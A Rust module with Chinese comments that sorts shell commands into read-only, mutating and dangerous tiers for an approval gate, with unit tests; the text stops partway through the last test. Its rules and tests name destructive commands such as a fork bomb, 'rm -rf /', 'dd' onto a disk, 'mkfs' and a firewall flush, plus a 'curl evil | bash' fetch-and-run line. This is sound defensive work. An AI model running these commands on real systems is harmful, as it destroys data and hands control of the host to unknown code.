//! 命令风险分级。
//!
//! **所有权**：Backend-C 完整实现。
//!
//! 规则见 docs/ARCHITECTURE.md §4.5。核心原则：**fail-safe** —— 解析不确定时提升风险。
//!
//! 分级模型：
//! - `ReadOnly`：命中只读白名单（剥离 `sudo`/`env`/`timeout` 等前缀后判定），无需审批
//! - `Mutating`：其余一切会改状态的命令（写文件、装包、重启服务、未知程序）
//! - `Dangerous`：不可逆/破坏性操作（格式化、写块设备、清空防火墙、fork bomb 等）
//!
//! 复合命令按 `;` `&&` `||` `|` 以及换行拆分，**取最高风险**。
//! 任何解析失败（引号/`$()`/反引号未闭合、嵌套过深、`eval`）都提升为 `Mutating`。

use crate::ipc::dto::Risk;

/// 分级结果。
#[derive(Debug, Clone)]
pub struct Classification {
    pub risk: Risk,
    pub reason: String,
}

impl Classification {
    fn new(risk: Risk, reason: impl Into<String>) -> Self {
        Self {
            risk,
            reason: reason.into(),
        }
    }
}

/// 允许的 shell 嵌套深度（`bash -c '...'`）。
const MAX_DEPTH: u8 = 3;
/// 单条命令最多拆分的子命令数量。
const MAX_SEGMENTS: usize = 64;

fn rank(risk: Risk) -> u8 {
    match risk {
        Risk::ReadOnly => 0,
        Risk::Mutating => 1,
        Risk::Dangerous => 2,
    }
}

/// 分类一条 shell 命令。
pub fn classify(command: &str) -> Classification {
    let raw = command.trim();
    if raw.is_empty() {
        return Classification::new(Risk::Mutating, "空命令：按保守策略视为需审批");
    }
    if raw.len() > 8192 {
        return Classification::new(Risk::Mutating, "命令长度异常（>8KB），按保守策略视为需审批");
    }

    // 1) 全局高危模式（先判，避免拆分后漏判）
    if let Some(reason) = dangerous_reason(raw) {
        return Classification::new(Risk::Dangerous, reason);
    }

    // 2) fail-safe：eval 无法静态判定
    if contains_word(raw, "eval") {
        return Classification::new(
            Risk::Mutating,
            "命令包含 eval，静态无法判定实际执行内容，提升为需审批",
        );
    }

    // 3) 拆分并逐段分析
    match analyze(raw, 0) {
        Ok(None) => Classification::new(Risk::ReadOnly, "全部子命令均命中只读白名单"),
        Ok(Some(c)) => c,
        Err(reason) => Classification::new(Risk::Mutating, reason),
    }
}

/// 分析一段（可能复合的）命令；`Ok(None)` 表示全部只读。
fn analyze(input: &str, depth: u8) -> Result<Option<Classification>, String> {
    if depth > MAX_DEPTH {
        return Err("shell 嵌套过深，静态无法判定，提升为需审批".into());
    }
    let segs = split_segments(input)?;
    if segs.len() > MAX_SEGMENTS {
        return Err("复合命令过于复杂（子命令过多），提升为需审批".into());
    }

    let mut worst: Option<Classification> = None;
    for seg in &segs {
        if let Some(c) = classify_segment(seg, depth)? {
            let replace = match &worst {
                Some(w) => rank(c.risk) > rank(w.risk),
                None => true,
            };
            if replace {
                worst = Some(c);
            }
        }
    }
    Ok(worst)
}

/// 单个子命令（已不含顶层分隔符）。
fn classify_segment(seg: &str, depth: u8) -> Result<Option<Classification>, String> {
    let s = seg.trim();
    if s.is_empty() {
        return Ok(None);
    }

    // 高危模式（子命令级）
    if let Some(reason) = dangerous_reason(s) {
        return Ok(Some(Classification::new(Risk::Dangerous, reason)));
    }

    // 写文件重定向
    if has_file_redirect(s) {
        return Ok(Some(Classification::new(
            Risk::Mutating,
            "命令包含写文件的重定向（目标不是 /dev/null 等设备），会写入磁盘",
        )));
    }

    // 命令替换：递归分析内部的命令，内部非只读则整体提升
    for inner in find_substitutions(s)? {
        if inner.trim().is_empty() {
            continue;
        }
        if let Some(c) = analyze(&inner, depth + 1)? {
            return Ok(Some(Classification::new(
                Risk::Mutating,
                format!("命令替换 `$()`/反引号 中存在非只读命令：{}", c.reason),
            )));
        }
    }

    // 剥掉 sudo / env / timeout 等前缀与环境变量赋值
    let ws = words(s);

    // `sudo -i` / `sudo -s` / `su -` / `su root` 会进入交互式 root shell。
    // 必须在 peel 之前判断：`su root` 剥离后剩 ["root"] 非空，会绕过后续的空命令分支。
    if enters_interactive_root_shell(&ws) {
        return Ok(Some(Classification::new(
            Risk::Dangerous,
            "`sudo -i`/`sudo -s`/`su -`/`su root` 会获得交互式 root shell，等价于完全控制主机",
        )));
    }

    // `su -c '<script>'` / `sudo -c ...`：递归分析脚本本体，避免被当成空命令放行。
    if let Some(script) = su_command_script(&ws) {
        if depth >= MAX_DEPTH {
            return Err(format!("`{s}` 嵌套层数过多，静态无法完整判定，提升为需审批"));
        }
        return analyze(&script, depth + 1);
    }

    let w = peel(&ws);
    if w.is_empty() {
        // 只有变量赋值，或裸的 sudo/env 前缀，不产生副作用
        return Ok(None);
    }

    let program = basename(&w[0]);
    let args: &[String] = &w[1..];

    if is_shell(&program) {
        if let Some(script) = shell_script(args) {
            if depth >= MAX_DEPTH {
                return Err(format!(
                    "`{program} -c` 嵌套层数过多，静态无法完整判定，提升为需审批"
                ));
            }
            return analyze(&script, depth + 1);
        }
        return Ok(Some(Classification::new(
            Risk::Mutating,
            format!("`{program}` 会执行脚本或交互式 shell，无法静态判定"),
        )));
    }

    match judge(&program, args) {
        Verdict::Ro => Ok(None),
        Verdict::NotRo(reason) => Ok(Some(Classification::new(Risk::Mutating, reason))),
    }
}

// ───────────────────────────── 只读判定 ─────────────────────────────

enum Verdict {
    Ro,
    NotRo(String),
}

/// 判断剥离前缀后的 `program args` 是否只读。
fn judge(program: &str, args: &[String]) -> Verdict {
    let p = program.to_ascii_lowercase();
    let has = |pred: &dyn Fn(&str) -> bool| args.iter().any(|a| pred(a.as_str()));

    match p.as_str() {
        // 无条件只读
        "ls" | "pwd" | "whoami" | "id" | "df" | "free" | "ps" | "uptime" | "uname" | "ss"
        | "netstat" | "tail" | "head" | "grep" | "cat" | "du" | "stat" | "lsblk" | "lscpu"
        | "wc" | "echo" | "cut" | "tr" | "basename" | "dirname" | "readlink" | "nproc" | "tty"
        | "printenv" | "which" | "whereis" | "file" | "lsof" | "nslookup" | "dig" | "uniq"
        | "paste" | "nl" | "od" | "hexdump" | "strings" | "seq" | "expr" => Verdict::Ro,

        "journalctl" => {
            if has(&|a| {
                a.starts_with("--vacuum")
                    || a == "--rotate"
                    || a == "--flush"
                    || a == "--sync"
                    || a.starts_with("--relinquish")
            }) {
                Verdict::NotRo("journalctl 的维护类选项会修改/删除日志文件".into())
            } else {
                Verdict::Ro
            }
        }

        "date" => {
            if has(&|a| a == "-s" || a == "--set" || a.starts_with("--set=")) {
                Verdict::NotRo("date -s 会修改系统时间".into())
            } else {
                Verdict::Ro
            }
        }

        "top" => {
            if has(&|a| a.starts_with("-b") || a == "--batch") {
                Verdict::Ro
            } else {
                Verdict::NotRo("top 交互模式会持续占用终端，需 -b 批处理模式才视为只读".into())
            }
        }

        "sort" => {
            if has(&|a| a == "-o" || a.starts_with("--output") || a.starts_with("-o")) {
                Verdict::NotRo("sort -o 会把结果写入文件".into())
            } else {
                Verdict::Ro
            }
        }

        "awk" | "gawk" | "mawk" | "nawk" => {
            let script: String = args.join(" ").to_ascii_lowercase();
            if script.contains("system(")
                || script.contains("print >")
                || script.contains("printf >")
                || script.contains("| \"")
                || script.contains("|&")
                || script.contains("fflush")
                || script.contains("inplace")
            {
                Verdict::NotRo("awk 脚本中疑似包含外部命令调用或写文件操作".into())
            } else {
                Verdict::Ro
            }
        }

        "find" => {
            if has(&|a| {
                matches!(
                    a,
                    "-exec"
                        | "-execdir"
                        | "-ok"
                        | "-okdir"
                        | "-delete"
                        | "-fprint"
                        | "-fprintf"
                        | "-fls"
                )
            }) {
                Verdict::NotRo("find 的 -exec/-delete/-fprint 等选项会执行命令或写入文件".into())
            } else {
                Verdict::Ro
            }
        }

        "hostname" => {
            if args.iter().any(|a| !a.starts_with('-')) {
                Verdict::NotRo("hostname 带参数时会修改主机名".into())
            } else {
                Verdict::Ro
            }
        }

        "systemctl" => match args.first().map(|s| s.as_str()) {
            Some("status")
            | Some("is-active")
            | Some("is-enabled")
            | Some("is-failed")
            | Some("show")
            | Some("cat")
            | Some("list-units")
            | Some("list-unit-files")
            | Some("list-timers")
            | Some("list-sockets")
            | Some("list-jobs")
            | Some("list-machines")
            | Some("--version")
            | Some("--help") => Verdict::Ro,
            _ => Verdict::NotRo(
                "systemctl 除 status/is-*/list/cat 之外的操作会改变服务状态".into(),
            ),
        },

        "ip" => {
            const MUTATING: &[&str] = &[
                "set", "add", "del", "delete", "flush", "change", "replace", "append", "prepend",
                "up", "down", "restore", "save", "update",
            ];
            let bad = args
                .iter()
                .any(|a| MUTATING.contains(&a.to_ascii_lowercase().as_str()));
            if bad {
                Verdict::NotRo("ip 的 set/add/del/up/down 等子命令会修改网络配置".into())
            } else {
                Verdict::Ro
            }
        }

        "ifconfig" => {
            if args.iter().filter(|a| !a.starts_with('-')).count() <= 1 {
                Verdict::Ro
            } else {
                Verdict::NotRo("ifconfig 带操作参数会修改网络配置".into())
            }
        }

        _ => Verdict::NotRo(format!(
            "`{program}` 不在只读白名单内，执行前需人工确认"
        )),
    }
}

// ───────────────────────────── 高危模式 ─────────────────────────────

/// 返回命中高危模式的中文原因。
fn dangerous_reason(s: &str) -> Option<String> {
    let nospace: String = s
        .to_ascii_lowercase()
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();

    // fork bomb: :(){ :|:& };:
    if nospace.contains("(){") && nospace.contains("};") && nospace.contains("|:&") {
        return Some("疑似 fork bomb（:(){ :|:& };:），短时间内可耗尽系统进程资源".into());
    }

    // 直接写块设备
    for pat in [
        ">/dev/sda",
        ">/dev/sdb",
        ">/dev/vda",
        ">/dev/hda",
        ">/dev/nvme",
        ">/dev/mmcblk",
        ">/dev/mapper",
        ">/dev/mtd",
    ] {
        if nospace.contains(pat) {
            return Some(format!("重定向写入块设备（{pat}），会直接破坏磁盘数据"));
        }
    }

    let ws = words(s);
    let w = peel(&ws);
    if w.is_empty() {
        return None;
    }
    let program = basename(&w[0]);
    let p = program.to_ascii_lowercase();
    let args: &[String] = &w[1..];

    // 磁盘格式化 / 分区改写
    if p.starts_with("mkfs") {
        return Some(format!("`{program}` 会格式化文件系统，数据不可恢复"));
    }
    match p.as_str() {
        "wipefs" | "mkswap" | "fdisk" | "parted" | "sgdisk" | "gdisk" | "cfdisk" => {
            return Some(format!("`{program}` 会改写磁盘分区/签名，数据不可恢复"));
        }
        _ => {}
    }

    // dd 写设备
    if p == "dd" {
        if args
            .iter()
            .any(|a| a.to_ascii_lowercase().starts_with("of=/dev/"))
        {
            return Some("dd 直接写块设备（of=/dev/...），会破坏磁盘数据".into());
        }
    }

    // 关机/重启
    if matches!(
        p.as_str(),
        "shutdown" | "reboot" | "poweroff" | "halt" | "telinit"
    ) {
        return Some(format!("`{program}` 会关机或重启系统，导致会话中断"));
    }
    if p == "init" {
        let first = args.iter().find(|a| !a.starts_with('-')).map(|a| a.as_str());
        if let Some(level) = first {
            if matches!(level, "0" | "6") {
                return Some(format!("`init {level}` 会切到关机/重启运行级别"));
            }
        }
    }

    // 防火墙清空
    if matches!(p.as_str(), "iptables" | "ip6tables" | "nft") {
        let flush = args.iter().any(|a| {
            matches!(
                a.as_str(),
                "-F" | "-X" | "-Z" | "--flush" | "--delete" | "flush"
            )
        });
        if flush {
            return Some(format!("`{program}` 会清空防火墙规则，可能导致远程失联"));
        }
    }

    // rm 递归删除关键路径
    if p == "rm" {
        if args.iter().any(|a| a == "--no-preserve-root") {
            return Some("rm 使用 --no-preserve-root 递归删除根目录".into());
        }
        let recursive = args.iter().any(|a| {
            a == "--recursive"
                || (a.starts_with('-')
                    && !a.starts_with("--")
                    && a.chars().skip(1).any(|c| c == 'r' || c == 'R'))
        });
        if recursive {
            for a in args {
                if a.starts_with('-') {
                    continue;
                }
                let t = a.trim_end_matches('/');
                let t_norm = t.trim_end_matches('*').trim_end_matches('.');
                let critical = t.is_empty()
                    || t_norm.is_empty()
                    || matches!(
                        t_norm,
                        "/"
                            | "/bin"
                            | "/boot"
                            | "/dev"
                            | "/etc"
                            | "/home"
                            | "/lib"
                            | "/lib64"
                            | "/opt"
                            | "/proc"
                            | "/root"
                            | "/sbin"
                            | "/sys"
                            | "/usr"
                            | "/var"
                            | "/mnt"
                            | "/media"
                            | "/srv"
                            | "/run"
                    );
                if critical {
                    return Some(format!("rm 递归删除关键路径 `{a}`，系统可能被破坏"));
                }
            }
        }
    }

    // chmod -R 777 <绝对路径>
    if p == "chmod" {
        let recursive = args.iter().any(|a| {
            a == "--recursive"
                || (a.starts_with('-')
                    && !a.starts_with("--")
                    && a.chars().skip(1).any(|c| c == 'r' || c == 'R'))
        });
        let mode777 = args
            .iter()
            .any(|a| matches!(a.as_str(), "777" | "0777" | "7777"));
        // 根目标：绝对路径且不是普通目录（/ 或 /* 或顶层目录）
        let root_target = args.iter().any(|a| {
            !a.starts_with('-') && !a.chars().all(|c| c.is_ascii_digit()) && a.starts_with('/')
        });
        if recursive && mode777 && root_target {
            return Some("chmod -R 777 应用到绝对路径根，会彻底破坏权限体系".into());
        }
    }

    // chown/chgrp 递归改根目录
    if matches!(p.as_str(), "chown" | "chgrp") {
        let recursive = args.iter().any(|a| {
            a.starts_with('-')
                && !a.starts_with("--")
                && a.chars().skip(1).any(|c| c == 'r' || c == 'R')
        });
        if recursive && args.iter().any(|a| matches!(a.as_str(), "/" | "/*" | "/.")) {
            return Some(format!("`{program} -R` 递归修改根目录属主，会破坏系统权限"));
        }
    }

    None
}

// ───────────────────────────── 解析工具 ─────────────────────────────

fn push_seg(out: &mut Vec<String>, cur: &mut String) {
    let t = cur.trim();
    if !t.is_empty() {
        out.push(t.to_string());
    }
    cur.clear();
}

/// 按顶层分隔符拆分复合命令。引号/`$()` 内的分隔符不拆。
fn split_segments(input: &str) -> Result<Vec<String>, String> {
    let mut out: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut depth: usize = 0;
    let mut it = input.chars().peekable();

    while let Some(c) = it.next() {
        if let Some(q) = quote {
            cur.push(c);
            if q == '"' && c == '\\' {
                if let Some(n) = it.next() {
                    cur.push(n);
                }
            } else if c == q {
                quote = None;
            }
            continue;
        }

        match c {
            '\'' | '"' => {
                quote = Some(c);
                cur.push(c);
            }
            '$' => {
                if it.peek() == Some(&'(') {
                    it.next();
                    cur.push('$');
                    cur.push('(');
                    depth += 1;
                } else {
                    cur.push(c);
                }
            }
            '(' if depth > 0 => {
                depth += 1;
                cur.push(c);
            }
            ')' if depth > 0 => {
                depth -= 1;
                cur.push(c);
            }
            ';' | '\n' | '\r' if depth == 0 => {
                push_seg(&mut out, &mut cur);
            }
            '&' if depth == 0 => {
                let prev = cur.trim_end().chars().last();
                if matches!(prev, Some('>') | Some('<')) {
                    // `2>&1` / `>&2` 这类 fd 复制，不是分隔符
                    cur.push('&');
                } else {
                    if it.peek() == Some(&'&') {
                        it.next();
                    }
                    push_seg(&mut out, &mut cur);
                }
            }
            '|' if depth == 0 => {
                if it.peek() == Some(&'|') {
                    it.next();
                }
                push_seg(&mut out, &mut cur);
            }
            _ => cur.push(c),
        }
    }

    if quote.is_some() {
        return Err("命令包含未闭合的引号，无法安全解析，提升为需审批".into());
    }
    if depth != 0 {
        return Err("命令包含未闭合的 `$()` 命令替换，无法安全解析，提升为需审批".into());
    }
    push_seg(&mut out, &mut cur);
    Ok(out)
}

/// 提取 `$()` 与反引号内的命令（用于递归判定）。
fn find_substitutions(seg: &str) -> Result<Vec<String>, String> {
    let chars: Vec<char> = seg.chars().collect();
    let mut out: Vec<String> = Vec::new();
    let mut i = 0usize;
    let mut quote: Option<char> = None;

    while i < chars.len() {
        let c = chars[i];
        if let Some(q) = quote {
            if q == '"' && c == '\\' {
                i += 2;
                continue;
            }
            if c == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match c {
            '\'' | '"' => {
                quote = Some(c);
                i += 1;
            }
            '`' => {
                let mut inner = String::new();
                i += 1;
                while i < chars.len() && chars[i] != '`' {
                    inner.push(chars[i]);
                    i += 1;
                }
                if i >= chars.len() {
                    return Err("命令包含未闭合的反引号命令替换，无法安全解析".into());
                }
                i += 1;
                out.push(inner);
            }
            '$' if i + 1 < chars.len() && chars[i + 1] == '(' => {
                let mut depth = 1usize;
                let mut inner = String::new();
                i += 2;
                while i < chars.len() {
                    let ch = chars[i];
                    if ch == '(' {
                        depth += 1;
                        inner.push(ch);
                        i += 1;
                    } else if ch == ')' {
                        depth -= 1;
                        if depth == 0 {
                            i += 1;
                            break;
                        }
                        inner.push(ch);
                        i += 1;
                    } else {
                        inner.push(ch);
                        i += 1;
                    }
                }
                if depth != 0 {
                    return Err("命令包含未闭合的 `$()` 命令替换，无法安全解析".into());
                }
                out.push(inner);
            }
            _ => i += 1,
        }
    }
    Ok(out)
}

/// 是否包含写文件的重定向（`>/dev/null`、`2>&1` 不算）。
fn has_file_redirect(s: &str) -> bool {
    let chars: Vec<char> = s.chars().collect();
    let mut i = 0usize;
    let mut quote: Option<char> = None;

    while i < chars.len() {
        let c = chars[i];
        if let Some(q) = quote {
            if q == '"' && c == '\\' {
                i += 2;
                continue;
            }
            if c == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        if c == '\'' || c == '"' {
            quote = Some(c);
            i += 1;
            continue;
        }
        if c == '>' {
            // `>&1` / `2>&1`：fd 复制
            if i + 1 < chars.len() && chars[i + 1] == '&' {
                i += 2;
                continue;
            }
            let mut j = i + 1;
            while j < chars.len() && (chars[j] == '>' || chars[j] == '|') {
                j += 1;
            }
            while j < chars.len() && chars[j].is_whitespace() {
                j += 1;
            }
            let mut target = String::new();
            while j < chars.len()
                && !chars[j].is_whitespace()
                && chars[j] != ';'
                && chars[j] != '|'
                && chars[j] != '&'
            {
                target.push(chars[j]);
                j += 1;
            }
            let t = target.trim();
            if t.is_empty() {
                i += 1;
                continue;
            }
            if t == "/dev/null"
                || t == "/dev/stdout"
                || t == "/dev/stderr"
                || t == "/dev/tty"
                || t.starts_with('&')
            {
                i = j;
                continue;
            }
            return true;
        }
        i += 1;
    }
    false
}

/// 空白切分（引号内的空白不切，成对引号被移除）。
fn words(s: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut any = false;

    for c in s.chars() {
        match quote {
            Some(q) => {
                if q == '"' && c == '\\' {
                    cur.push(c);
                } else if c == q {
                    quote = None;
                } else {
                    cur.push(c);
                }
                any = true;
            }
            None => {
                if c.is_whitespace() {
                    if any {
                        out.push(std::mem::take(&mut cur));
                        any = false;
                    }
                } else if c == '\'' || c == '"' {
                    quote = Some(c);
                    any = true;
                } else {
                    cur.push(c);
                    any = true;
                }
            }
        }
    }
    if any {
        out.push(cur);
    }
    out
}

fn basename(token: &str) -> String {
    match token.rsplit('/').next() {
        Some(t) if !t.is_empty() => t.to_string(),
        _ => token.to_string(),
    }
}

/// 是否为「进入交互式 root shell」的调用。
///
/// 这类命令剥离前缀后为空，但实际能力等同于 root 全权 —— 必须判为高危，
/// 否则 `sudo -i` 会被当成只读放行。
fn enters_interactive_root_shell(words_in: &[String]) -> bool {
    let Some(first) = words_in.first() else {
        return false;
    };
    let program = basename(first).to_ascii_lowercase();
    if !matches!(program.as_str(), "sudo" | "doas" | "su") {
        return false;
    }

    let rest: Vec<String> = words_in[1..].to_vec();

    // `su` 家族：`su`（无参即 root）/ `su -` / `su -l` / `su --login` /
    // `su root`（不带 -c 命令时都是交互 shell）
    if program == "su" {
        // `su -c 'cmd' [user]` 是执行单条命令，不算交互 root shell
        let has_command = rest
            .iter()
            .any(|t| t == "-c" || t == "--command" || t.starts_with("--command="));
        if has_command {
            return false;
        }
        // 目标用户是 root 或未指定
        let target = rest
            .iter()
            .filter(|t| !t.starts_with('-'))
            .next()
            .map(|s| s.to_ascii_lowercase());
        return match target {
            None => true,
            Some(u) => u == "root" || u == "0",
        };
    }

    // sudo / doas：`-i` / `--login` / `-s` / `--shell` 进入交互 shell
    for t in &rest {
        if matches!(
            t.as_str(),
            "-i" | "-s" | "-is" | "-si" | "--login" | "--shell"
        ) {
            return true;
        }
        // 组合短选项里含 i 或 s，如 `-Hsi`
        if t.starts_with('-') && !t.starts_with("--") {
            let flags = &t[1..];
            if flags.chars().any(|c| c == 'i' || c == 's') {
                // 但 `-u`/`-p` 等带参短选项的值里可能出现 i/s，需排除
                if !flags.starts_with('u') && !flags.starts_with('p') {
                    return true;
                }
            }
        }
        // 遇到 sudo 的目标身份参数，其值不该被误判
        if matches!(t.as_str(), "-u" | "--user") {
            continue;
        }
    }

    // `sudo` 无任何命令且无 -i/-s：打印用法，无副作用 → 不算
    false
}

/// 提取 `su -c '<script>'` / `su --command='<script>'` 的脚本内容。
///
/// 这类形式本质是「以 root 执行一段 shell 脚本」，应递归分析脚本本身，
/// 而不是把 `-c` 当成无参选项导致误判。
fn su_command_script(words_in: &[String]) -> Option<String> {
    let first = words_in.first()?;
    let program = basename(first).to_ascii_lowercase();
    if !matches!(program.as_str(), "su" | "sudo" | "doas") {
        return None;
    }

    let mut i = 1;
    while i < words_in.len() {
        let t = &words_in[i];
        if let Some(inline) = t.strip_prefix("--command=") {
            return Some(inline.to_string());
        }
        if t == "-c" || t == "--command" {
            return words_in.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn is_env_assignment(token: &str) -> bool {
    if token.starts_with('-') {
        return false;
    }
    let Some((lhs, _rhs)) = token.split_once('=') else {
        return false;
    };
    if lhs.is_empty() {
        return false;
    }
    let mut chars = lhs.chars();
    let first_ok = chars
        .next()
        .map(|c| c.is_ascii_alphabetic() || c == '_')
        .unwrap_or(false);
    first_ok && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn contains_word(s: &str, target: &str) -> bool {
    words(s)
        .iter()
        .map(|w| basename(w))
        .any(|w| w.eq_ignore_ascii_case(target))
}

fn is_shell(program: &str) -> bool {
    matches!(
        program.to_ascii_lowercase().as_str(),
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "mksh" | "fish"
    )
}

/// 若参数里有 `-c`，取出其后的脚本内容。
fn shell_script(args: &[String]) -> Option<String> {
    let mut idx = None;
    for (i, a) in args.iter().enumerate() {
        if a == "-c" {
            idx = Some(i);
            break;
        }
        if a.starts_with("--") {
            continue;
        }
        if a.starts_with('-') && a.chars().skip(1).any(|c| c == 'c') {
            idx = Some(i);
            break;
        }
    }
    let i = idx?;
    args.get(i + 1).cloned()
}

/// 剥离前缀命令（sudo/env/timeout/nohup/...）与环境变量赋值。
fn peel(words_in: &[String]) -> &[String] {
    let mut w = words_in;
    for _ in 0..8 {
        let Some(first) = w.first() else {
            return w;
        };

        if is_env_assignment(first) {
            w = &w[1..];
            continue;
        }

        let base_lower = basename(first).to_ascii_lowercase();
        match base_lower.as_str() {
            "sudo" | "doas" | "su" => {
                w = &w[1..];
                // sudo 选项（部分带参数）
                while let Some(t) = w.first() {
                    if !t.starts_with('-') {
                        break;
                    }
                    let takes_arg = matches!(
                        t.as_str(),
                        "-u" | "-g"
                            | "-p"
                            | "-C"
                            | "-h"
                            | "-r"
                            | "-t"
                            | "-U"
                            | "--user"
                            | "--group"
                            | "--prompt"
                            | "--host"
                            | "--role"
                            | "--type"
                            | "--other-user"
                            | "--close-from"
                    );
                    let n = if takes_arg { 2 } else { 1 };
                    let n = n.min(w.len());
                    w = &w[n..];
                }
            }
            "env" => {
                w = &w[1..];
                while let Some(t) = w.first() {
                    if t.starts_with('-') || is_env_assignment(t) {
                        w = &w[1..];
                    } else {
                        break;
                    }
                }
            }
            "timeout" => {
                w = &w[1..];
                while let Some(t) = w.first() {
                    if !t.starts_with('-') {
                        break;
                    }
                    let takes_arg =
                        matches!(t.as_str(), "-s" | "-k" | "--signal" | "--kill-after");
                    let n = if takes_arg { 2 } else { 1 };
                    let n = n.min(w.len());
                    w = &w[n..];
                }
                // 时长参数
                if !w.is_empty() {
                    w = &w[1..];
                }
            }
            "nice" | "ionice" | "stdbuf" | "nohup" | "command" | "builtin" | "time" => {
                w = &w[1..];
                while let Some(t) = w.first() {
                    if !t.starts_with('-') {
                        break;
                    }
                    let takes_arg =
                        matches!(t.as_str(), "-n" | "-c" | "-p" | "-t" | "-i" | "-o" | "-e");
                    let n = if takes_arg { 2 } else { 1 };
                    let n = n.min(w.len());
                    w = &w[n..];
                }
            }
            _ => return w,
        }

        if w.is_empty() {
            return w;
        }
    }
    w
}

// ───────────────────────────── 单元测试 ─────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn risk_of(cmd: &str) -> Risk {
        classify(cmd).risk
    }

    #[test]
    fn readonly_basics() {
        for cmd in [
            "ls -la",
            "pwd",
            "whoami",
            "id",
            "df -h",
            "free -m",
            "ps aux",
            "uptime",
            "uname -a",
            "hostname",
            "ss -tlnp",
            "netstat -an",
            "cat /etc/passwd",
            "lsblk",
            "lscpu",
            "wc -l /var/log/syslog",
            "stat /etc/hosts",
            "date",
            "echo hello",
            "du -sh /var",
            "/bin/ls -l",
        ] {
            assert_eq!(risk_of(cmd), Risk::ReadOnly, "expect readonly: {cmd}");
        }
    }

    #[test]
    fn readonly_with_prefixes() {
        assert_eq!(risk_of("sudo ls -la"), Risk::ReadOnly);
        assert_eq!(risk_of("sudo -u root df -h"), Risk::ReadOnly);
        assert_eq!(risk_of("env FOO=1 ps aux"), Risk::ReadOnly);
        assert_eq!(risk_of("timeout 10 cat /var/log/x"), Risk::ReadOnly);
        assert_eq!(risk_of("PATH=/usr/bin:/bin ls /tmp"), Risk::ReadOnly);
        assert_eq!(risk_of("sudo /bin/ls -l"), Risk::ReadOnly);
    }

    #[test]
    fn readonly_special_cases() {
        assert_eq!(risk_of("systemctl status nginx"), Risk::ReadOnly);
        assert_eq!(risk_of("journalctl -u nginx --since 1h"), Risk::ReadOnly);
        assert_eq!(risk_of("journalctl --vacuum-size=10M"), Risk::Mutating);
        assert_eq!(risk_of("top -b -n1"), Risk::ReadOnly);
        assert_eq!(risk_of("top"), Risk::Mutating);
        assert_eq!(risk_of("awk '{print $1}' /etc/passwd"), Risk::ReadOnly);
        assert_eq!(risk_of("find / -name '*.log'"), Risk::ReadOnly);
        assert_eq!(risk_of("find / -name x -delete"), Risk::Mutating);
        assert_eq!(
            risk_of("grep foo /var/log/syslog 2>/dev/null"),
            Risk::ReadOnly
        );
        assert_eq!(risk_of("date -s 2020-01-01"), Risk::Mutating);
        assert_eq!(risk_of("hostname web01"), Risk::Mutating);
        assert_eq!(risk_of("ip a"), Risk::ReadOnly);
        assert_eq!(risk_of("ip addr add 10.0.0.2/24 dev eth0"), Risk::Mutating);
        assert_eq!(risk_of("sort -o out.txt in.txt"), Risk::Mutating);
    }

    #[test]
    fn compound_takes_max_risk() {
        assert_eq!(risk_of("ls && df -h"), Risk::ReadOnly);
        assert_eq!(risk_of("ls -la | grep foo"), Risk::ReadOnly);
        assert_eq!(risk_of("ls; pwd || uname -a"), Risk::ReadOnly);
        assert_eq!(risk_of("ls -la && rm -rf /tmp/x"), Risk::Mutating);
        assert_eq!(risk_of("ls; rm -rf /"), Risk::Dangerous);
        assert_eq!(
            risk_of("cat /etc/hosts | mkfs.ext4 /dev/sda1"),
            Risk::Dangerous
        );
    }

    #[test]
    fn mutating_defaults() {
        for cmd in [
            "rm -rf /tmp/build",
            "apt-get install -y nginx",
            "systemctl restart nginx",
            "touch /tmp/x",
            "cp a b",
            "mv a b",
            "sed -i 's/a/b/' f",
            "kill -9 1234",
            "docker run hello-world",
            "nginx -s reload",
        ] {
            assert_eq!(risk_of(cmd), Risk::Mutating, "expect mutating: {cmd}");
        }
    }

    #[test]
    fn dangerous_rules() {
        assert_eq!(risk_of("rm -rf /"), Risk::Dangerous);
        assert_eq!(risk_of("rm -rf /*"), Risk::Dangerous);
        assert_eq!(risk_of("rm -rf /etc"), Risk::Dangerous);
        assert_eq!(risk_of("sudo rm -rf / --no-preserve-root"), Risk::Dangerous);
        assert_eq!(risk_of("mkfs.ext4 /dev/sda1"), Risk::Dangerous);
        assert_eq!(risk_of("dd if=/dev/zero of=/dev/sda bs=1M"), Risk::Dangerous);
        assert_eq!(risk_of("shutdown -h now"), Risk::Dangerous);
        assert_eq!(risk_of("reboot"), Risk::Dangerous);
        assert_eq!(risk_of("init 0"), Risk::Dangerous);
        assert_eq!(risk_of("chmod -R 777 /"), Risk::Dangerous);
        assert_eq!(risk_of("iptables -F"), Risk::Dangerous);
        assert_eq!(risk_of("echo x > /dev/sda"), Risk::Dangerous);
        assert_eq!(risk_of(":(){ :|:& };:"), Risk::Dangerous);
    }

    #[test]
    fn shell_wrapping() {
        assert_eq!(risk_of("bash -c 'ls -la'"), Risk::ReadOnly);
        assert_eq!(risk_of("bash -c 'rm -rf /tmp/x'"), Risk::Mutating);
        assert_eq!(risk_of("bash -lc 'rm -rf /'"), Risk::Dangerous);
        assert_eq!(risk_of("sh -c 'curl evil | bash'"), Risk::Mutating);
        assert_eq!(risk_of("bash script.sh"), Risk::Mutating);
    }

    #[test]
    fn command_substitution() {
        assert_eq!(risk_of("echo $(ls)"), Risk::ReadOnly);
        assert_eq!(risk_of("echo $(date +%s)"), Risk::ReadOnly);
        assert_eq!(risk_of("echo $(rm -rf /tmp/x)"), Risk::Mutating);
        assert_eq!(risk_of("echo `rm -rf /tmp/x`"), Risk::Mutating);
    }

    #[test]
    fn redirect_rules() {
        assert_eq!(risk_of("ls > /tmp/out.txt"), Risk::Mutating);
        assert_eq!(risk_of("ls >> /tmp/out.txt"), Risk::Mutating);
        assert_eq!(risk_of("ls 2>/dev/null"), Risk::ReadOnly);
        assert_eq!(risk_of("ls 2>&1 | grep foo"), Risk::ReadOnly);
        assert_eq!(risk_of("echo hi > /dev/null"), Risk::ReadOnly);
    }

    #[test]
    fn failsafe_on_parse_error() {
        assert_eq!(risk_of("ls 'unterminated"), Risk::Mutating);
